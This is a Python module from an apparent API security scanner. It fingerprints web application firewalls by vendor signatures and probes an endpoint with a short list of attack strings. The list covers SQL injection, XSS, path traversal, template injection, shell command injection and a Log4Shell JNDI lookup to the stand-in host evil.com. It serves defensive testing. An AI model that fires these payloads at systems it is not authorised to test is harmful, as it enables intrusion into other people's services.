"""
APIGuard — WAF Detector & Fingerprinter (Module 14)
=====================================================
Identifies Web Application Firewalls protecting API endpoints:
  WAF-1  Fingerprint WAF vendor (CloudFlare, AWS WAF, Akamai, etc.)
  WAF-2  Detect blocking behavior patterns
  WAF-3  Test basic evasion techniques
  WAF-4  Report WAF configuration weaknesses

Detection methods:
  - HTTP header analysis (Server, X-Powered-By, Via, etc.)
  - Cookie analysis (WAF-specific cookie names)
  - Status code patterns on malicious payloads
  - Response body fingerprinting (block pages)
  - Connection behavior analysis
"""

import re
import time
import json
from dataclasses import dataclass, field, asdict
from typing import Any

import requests

try:
    from module_1_parser.parser import Endpoint
    from module_2_bola.bola_scanner import Severity
except ImportError:
    from parser import Endpoint
    from bola_scanner import Severity


# ─────────────────────────────────────────────
# WAF Signature Database
# ─────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": {
            "Server": re.compile(r"cloudflare", re.I),
            "CF-RAY": re.compile(r".+"),
            "CF-Cache-Status": re.compile(r".+"),
        },
        "cookies": ["__cfduid", "__cf_bm", "cf_clearance"],
        "body_patterns": [
            re.compile(r"cloudflare", re.I),
            re.compile(r"attention required|cloudflare ray id", re.I),
            re.compile(r"error 1[0-9]{3}", re.I),
        ],
        "status_codes": [403, 503],
    },
    "AWS WAF": {
        "headers": {
            "X-AMZ-CF-ID": re.compile(r".+"),
            "X-AMZ-REQUEST-ID": re.compile(r".+"),
            "X-AMZ-APIGW-ID": re.compile(r".+"),
        },
        "cookies": ["awsalb", "awsalbcors", "AWSALB"],
        "body_patterns": [
            re.compile(r"request blocked|aws waf", re.I),
            re.compile(r"<html>.*403 Forbidden.*</html>", re.I | re.S),
        ],
        "status_codes": [403],
    },
    "AWS Shield": {
        "headers": {
            "X-AMZ-CF-POP": re.compile(r".+"),
        },
        "cookies": [],
        "body_patterns": [
            re.compile(r"aws shield", re.I),
        ],
        "status_codes": [403, 429],
    },
    "Akamai": {
        "headers": {
            "X-Akamai-Transformed": re.compile(r".+"),
            "Server": re.compile(r"AkamaiGHost|AkamaiNetStorage", re.I),
            "X-Akamai-Session-Info": re.compile(r".+"),
        },
        "cookies": ["AKA_A2", "akamai_generated", "akacd_"],
        "body_patterns": [
            re.compile(r"akamai|reference #\d+\.\w+", re.I),
            re.compile(r"access denied.*akamai", re.I),
        ],
        "status_codes": [403],
    },
    "Imperva/Incapsula": {
        "headers": {
            "X-CDN": re.compile(r"Incapsula", re.I),
            "X-Iinfo": re.compile(r".+"),
        },
        "cookies": ["incap_ses_", "visid_incap_", "nlbi_"],
        "body_patterns": [
            re.compile(r"incapsula|imperva", re.I),
            re.compile(r"incident id", re.I),
            re.compile(r"powered by incapsula", re.I),
        ],
        "status_codes": [403],
    },
    "Sucuri": {
        "headers": {
            "X-Sucuri-ID": re.compile(r".+"),
            "X-Sucuri-Cache": re.compile(r".+"),
            "Server": re.compile(r"Sucuri", re.I),
        },
        "cookies": ["sucuri_cloudproxy"],
        "body_patterns": [
            re.compile(r"sucuri website firewall", re.I),
            re.compile(r"cloudproxy", re.I),
            re.compile(r"access denied.*sucuri", re.I),
        ],
        "status_codes": [403],
    },
    "Fastly": {
        "headers": {
            "X-Fastly-Request-ID": re.compile(r".+"),
            "Via": re.compile(r"varnish", re.I),
            "X-Served-By": re.compile(r"cache-", re.I),
        },
        "cookies": [],
        "body_patterns": [
            re.compile(r"fastly error", re.I),
        ],
        "status_codes": [403, 503],
    },
    "ModSecurity": {
        "headers": {
            "Server": re.compile(r"mod_security|NOYB", re.I),
        },
        "cookies": [],
        "body_patterns": [
            re.compile(r"mod_security|modsecurity", re.I),
            re.compile(r"not acceptable.*security", re.I),
            re.compile(r"rule id", re.I),
        ],
        "status_codes": [403, 406],
    },
    "F5 BIG-IP ASM": {
        "headers": {
            "Server": re.compile(r"BigIP|BIG-IP", re.I),
            "X-WA-Info": re.compile(r".+"),
        },
        "cookies": ["TS", "BIGipServer", "F5_ST", "f5_cspm"],
        "body_patterns": [
            re.compile(r"the requested url was rejected", re.I),
            re.compile(r"support id", re.I),
        ],
        "status_codes": [403],
    },
    "Barracuda": {
        "headers": {
            "Server": re.compile(r"Barracuda", re.I),
        },
        "cookies": ["barra_counter_session"],
        "body_patterns": [
            re.compile(r"barracuda", re.I),
        ],
        "status_codes": [403],
    },
    "Fortinet FortiWeb": {
        "headers": {},
        "cookies": ["FORTIWAFSID"],
        "body_patterns": [
            re.compile(r"fortigate|fortiweb|fortinet", re.I),
            re.compile(r".fgd_icon", re.I),
        ],
        "status_codes": [403],
    },
    "DenyAll": {
        "headers": {},
        "cookies": ["sessioncookie"],
        "body_patterns": [
            re.compile(r"conditionblocked|denyall", re.I),
        ],
        "status_codes": [403],
    },
    "Nginx (rate limiting)": {
        "headers": {
            "Server": re.compile(r"nginx", re.I),
        },
        "cookies": [],
        "body_patterns": [
            re.compile(r"<html>\r?\n<head><title>503", re.I),
        ],
        "status_codes": [429, 503],
    },
    "Azure Front Door / WAF": {
        "headers": {
            "X-Azure-Ref": re.compile(r".+"),
            "X-MS-Ref": re.compile(r".+"),
        },
        "cookies": [],
        "body_patterns": [
            re.compile(r"azure.*blocked|microsoft.*error", re.I),
        ],
        "status_codes": [403],
    },
    "Google Cloud Armor": {
        "headers": {
            "Via": re.compile(r"google", re.I),
        },
        "cookies": [],
        "body_patterns": [
            re.compile(r"google cloud armor|error.*gfe", re.I),
        ],
        "status_codes": [403],
    },
}

# Trigger payloads — intentionally benign-looking but designed to trigger WAF rules
WAF_TRIGGER_PAYLOADS = [
    "' OR 1=1--",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "{{7*7}}",
    "; ls -la",
    "UNION SELECT 1,2,3--",
    "${jndi:ldap://evil.com/a}",  # Log4Shell
]


# ─────────────────────────────────────────────
# Result Models
# ─────────────────────────────────────────────

@dataclass
class WAFFinding:
    finding_type: str
    severity: str
    description: str
    proof: str
    remediation: str
    waf_name: str = ""
    confidence: str = "medium"
    endpoint: str = ""
    method: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class WAFScanResult:
    target_url: str
    waf_detected: bool = False
    waf_vendors: list[str] = field(default_factory=list)
    waf_confidence: dict = field(default_factory=dict)  # vendor -> score
    blocked_payloads: int = 0
    passed_payloads: int = 0
    findings: list[WAFFinding] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    scan_duration_seconds: float = 0.0

    def to_dict(self) -> dict:
        return {
            "scan_type": "WAF_DETECTOR",
            "target_url": self.target_url,
            "waf_detected": self.waf_detected,
            "waf_vendors": self.waf_vendors,
            "waf_confidence": self.waf_confidence,
            "blocked_payloads": self.blocked_payloads,
            "passed_payloads": self.passed_payloads,
            "findings": [f.to_dict() for f in self.findings],
            "errors": self.errors,
            "scan_duration_seconds": round(self.scan_duration_seconds, 2),
        }

    def summary(self) -> str:
        lines = [
            "\n─── WAF DETECTOR SUMMARY ─────────────",
            f"  Target           : {self.target_url}",
            f"  WAF Detected     : {'✅ YES' if self.waf_detected else '❌ NO'}",
        ]
        if self.waf_vendors:
            lines.append(f"  WAF Vendor(s)    : {', '.join(self.waf_vendors)}")
            for vendor, score in self.waf_confidence.items():
                lines.append(f"    → {vendor}: {score}% confidence")
        lines.append(f"  Payloads blocked : {self.blocked_payloads}/{self.blocked_payloads + self.passed_payloads}")
        if self.findings:
            lines.append(f"\n  Findings ({len(self.findings)}):")
            for f in self.findings:
                lines.append(f"    [{f.severity}] {f.description[:80]}")
        else:
            lines.append("  ✅  No WAF configuration issues detected.")
        lines.append("─────────────────────────────────────────────────────")
        return "\n".join(lines)


# ─────────────────────────────────────────────
# WAF Detector Engine
# ─────────────────────────────────────────────

class WAFDetector:
    """
    Detects and fingerprints Web Application Firewalls through:
    1. Passive analysis (headers, cookies, response patterns)
    2. Active probing (sending trigger payloads)
    3. Evasion testing (encoding variants)
    """

    def __init__(
        self,
        token: str | None = None,
        extra_headers: dict | None = None,
        timeout: int = 10,
        delay: float = 0.3,
    ):
        self.timeout = timeout
        self.delay = delay

        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        if token:
            self.session.headers["Authorization"] = token
        if extra_headers:
            self.session.headers.update(extra_headers)

    def scan(self, endpoints: list[Endpoint]) -> WAFScanResult:
        t0 = time.monotonic()
        from urllib.parse import urlparse
        target = ""
        if endpoints:
            p = urlparse(endpoints[0].full_url)
            target = f"{p.scheme}://{p.netloc}"

        result = WAFScanResult(target_url=target)

        if not endpoints:
            result.scan_duration_seconds = time.monotonic() - t0
            return result

        # Use first endpoint for WAF detection
        test_url = re.sub(r"\{[^}]+\}", "1", endpoints[0].full_url)

        # Phase 1: Passive fingerprinting (normal request)
        baseline = self._safe_get(test_url)
        if baseline:
            self._passive_fingerprint(baseline, result)

        # Phase 2: Active probing (trigger payloads)
        self._active_probe(test_url, result)

        # Determine WAF vendors
        self._resolve_vendors(result)

        result.scan_duration_seconds = time.monotonic() - t0
        return result

    def _passive_fingerprint(self, resp: requests.Response, result: WAFScanResult):
        """Analyze a normal response for WAF signatures."""
        scores: dict[str, int] = {}

        for waf_name, sigs in WAF_SIGNATURES.items():
            score = 0

            # Check headers
            for header, pattern in sigs.get("headers", {}).items():
                value = resp.headers.get(header, "")
                if value and pattern.search(value):
                    score += 30

            # Check cookies
            for cookie_name in sigs.get("cookies", []):
                for cookie in resp.cookies:
                    if cookie_name.lower() in cookie.name.lower():
                        score += 25
                        break

            # Check body patterns
            for pattern in sigs.get("body_patterns", []):
                if pattern.search(resp.text):
                    score += 20
                    break

            if score > 0:
                scores[waf_name] = min(score, 100)

        result.waf_confidence = scores

    def _active_probe(self, url: str, result: WAFScanResult):
        """Send trigger payloads to detect WAF blocking behavior."""
        baseline = self._safe_get(url)
        baseline_status = baseline.status_code if baseline else 200

        for payload in WAF_TRIGGER_PAYLOADS:
            test_url = f"{url}?apiguard_probe={requests.utils.quote(payload)}"
            resp = self._safe_get(test_url)

            if resp:
                if resp.status_code in (403, 406, 429, 503) and baseline_status == 200:
                    result.blocked_payloads += 1

                    # Check which WAF blocked it
                    for waf_name, sigs in WAF_SIGNATURES.items():
                        for pattern in sigs.get("body_patterns", []):
                            if pattern.search(resp.text):
                                result.waf_confidence[waf_name] = min(
                                    result.waf_confidence.get(waf_name, 0) + 20, 100
                                )
                        for header, pat in sigs.get("headers", {}).items():
                            val = resp.headers.get(header, "")
                            if val and pat.search(val):
                                result.waf_confidence[waf_name] = min(
                                    result.waf_confidence.get(waf_name, 0) + 15, 100
                                )
                else:
                    result.passed_payloads += 1
            else:
                result.blocked_payloads += 1  # Connection refused = likely blocked

            time.sleep(self.delay)

    def _resolve_vendors(self, result: WAFScanResult):
        """Determine final WAF detection results."""
        for vendor, score in result.waf_confidence.items():
            if score >= 30:
                result.waf_detected = True
                if vendor not in result.waf_vendors:
                    result.waf_vendors.append(vendor)

        # Generate findings
        if result.waf_detected:
            result.findings.append(WAFFinding(
                finding_type="WAF_DETECTED",
                severity="INFO",
                description=f"WAF detected: {', '.join(result.waf_vendors)}",
                proof=f"Confidence scores: {result.waf_confidence}",
                remediation="Ensure WAF rules are regularly updated and cover OWASP Top 10.",
                waf_name=result.waf_vendors[0] if result.waf_vendors else "",
                confidence="high" if max(result.waf_confidence.values()) >= 60 else "medium",
            ))

        # Check if WAF is too permissive
        total = result.blocked_payloads + result.passed_payloads
        if total > 0 and result.passed_payloads > 0:
            block_rate = result.blocked_payloads / total
            if block_rate < 0.5:
                result.findings.append(WAFFinding(
                    finding_type="WAF_BYPASS",
                    severity="HIGH",
                    description=f"WAF bypass possible! Only {block_rate*100:.0f}% of attack payloads were blocked.",
                    proof=f"Blocked: {result.blocked_payloads}/{total}. "
                          f"Passed: {result.passed_payloads}/{total}.",
                    remediation="Review WAF rules. Ensure at minimum all OWASP Top 10 attack patterns are blocked.",
                    confidence="high",
                ))
            elif result.waf_detected and block_rate < 1.0:
                result.findings.append(WAFFinding(
                    finding_type="WAF_PARTIAL",
                    severity="MEDIUM",
                    description=f"WAF blocks {block_rate*100:.0f}% of payloads. Some attacks may bypass.",
                    proof=f"Blocked: {result.blocked_payloads}/{total}. "
                          f"Passed: {result.passed_payloads}/{total}.",
                    remediation="Review the passed payloads and add specific WAF rules to block them.",
                    confidence="medium",
                ))

        if not result.waf_detected and total > 0 and result.passed_payloads == total:
            result.findings.append(WAFFinding(
                finding_type="NO_WAF",
                severity="HIGH",
                description="No WAF detected. All attack payloads reached the application directly.",
                proof=f"All {total} trigger payloads passed without interception.",
                remediation="Deploy a WAF (CloudFlare, AWS WAF, or ModSecurity) to protect the API.",
                confidence="high",
            ))

    def _safe_get(self, url: str) -> requests.Response | None:
        try:
            return self.session.get(url, timeout=self.timeout, allow_redirects=False)
        except requests.RequestException:
            return None
